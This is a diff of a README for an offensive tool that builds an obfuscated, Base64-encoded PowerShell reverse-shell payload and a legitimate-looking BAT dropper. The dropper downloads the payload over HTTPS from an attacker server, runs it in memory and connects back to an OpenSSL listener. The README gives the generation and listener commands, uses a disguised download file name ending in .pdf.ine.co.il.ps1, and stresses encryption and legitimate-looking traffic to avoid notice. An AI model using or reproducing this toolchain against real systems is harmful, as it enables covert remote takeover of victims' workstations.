@@ -28,50 +28,59 @@ cd Reception
 
 ## Usage
 
-Generate an Encoded PowerShell Script:
+The tool can generate two types of files, as chosen by the user:
+A PS1 file with obfuscation and Base64 encoding containing a Reverse shell payload.
+A legitimate BAT file that connects to a remote server to download the encoded PS1 file.
+
+To create the BAT file, I developed a Python script that acts as a listener for the PS1 file download request. The server can operate with an encryption certificate and supports connections over both HTTP and HTTPS. This ensures that the initial connection between the BAT file and the server for downloading the payload is conducted over an encrypted channel.
+
+The encoded PS1 file will be loaded into memory and establish a connection to another listener, which is set up using OpenSSL.
+
+This way, we can ensure that the communication is encrypted end-to-end.
+
+
+
+Creating a BAT file with the tool and transferring it to the listener's directory:
 ```bash
-python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type ps1
+python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/welcome.pdf.ine.co.il.ps1>
+```
+```
+![image](https://github.com/user-attachments/assets/350a0105-c8a3-43f5-8e67-fddb34cf84f8)
 ```
 
-Generate a Batch File and PowerShell Script:
+Opening a listener with the OpenSSL server to receive the Reverse shell connection, 
+and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
 ```bash
-python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type bat -server http://<Your_Server_ip|URL>/<File-Name>.ps1
+openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -quiet
+```
+```bash
+python3 listener.py -https_port <Your_Listener_Server_PORT>
+```
+```
+![image](https://github.com/user-attachments/assets/b64a4bf1-e801-4a3e-8a0b-eaa1acbd9ff8)
 ```
 
-Open a listener for downloadingg the PS1 file with listener.py:
-```bash
-python3 listener.py -port <Your_Server_PORT>
+Running the BAT file on the workstation, the file connects to our listener server over encrypted traffic:
+```
+![image](https://github.com/user-attachments/assets/a2b977f8-455c-42a8-9ec9-1e4d66905035)
 ```
 
-Open a listener for getting Reverse-Shell with OpenSSL:
-```bash
-openssl s_server -accept <Your_Listener_Port> -cert reception.pem -key reception.key -quiet
+Receiving a response from the listener server and establishing a Reverse shell from the workstation:
+```
+![image](https://github.com/user-attachments/assets/dee0bf16-68f4-4059-9bdf-3d28e859e4c5)
 ```
 
-## PoC:
-Generate a Batch File that downloading and executing a PS1 file:
+The encrypted network traffic:
+```
+![image](https://github.com/user-attachments/assets/7fa8673f-0d4c-40e5-9449-ef746b6b203f)
+```
 
-![image](https://github.com/user-attachments/assets/4816ff7f-e694-413b-8a82-eb6eec74df65)
-
-
-Running the Batch file on the target machine, the connection is not secure yet, and headers that look legitimate are passed:
-
-![image](https://github.com/user-attachments/assets/87a630c3-2310-4f91-a8fe-d0948523de2f)
-
-
-Running the listener server and getting a request for downloaing the PS1 file:
-
-![image](https://github.com/user-attachments/assets/14618c88-ba1b-452d-8b26-5e803c47772d)
-
-
-Traffic is secure:
-
-![image](https://github.com/user-attachments/assets/42f5453d-4687-4432-bfb4-070074260549)
-
-
-Getting a Secure Reverse Shell:
-
-![image](https://github.com/user-attachments/assets/16ecaf01-05fa-4e18-84a6-c063937ad808)
+And here is an example for those who want to create an encrypted listener server. 
+The BAT file will connect to the server to download the PS1 file, and you can observe the connection to the server. 
+The Reverse shell operation will then proceed in an encrypted manner:
+```
+![image](https://github.com/user-attachments/assets/77b78ae6-fc92-4fa9-93fa-ab43a9bc5b27)
+```
 
 
 
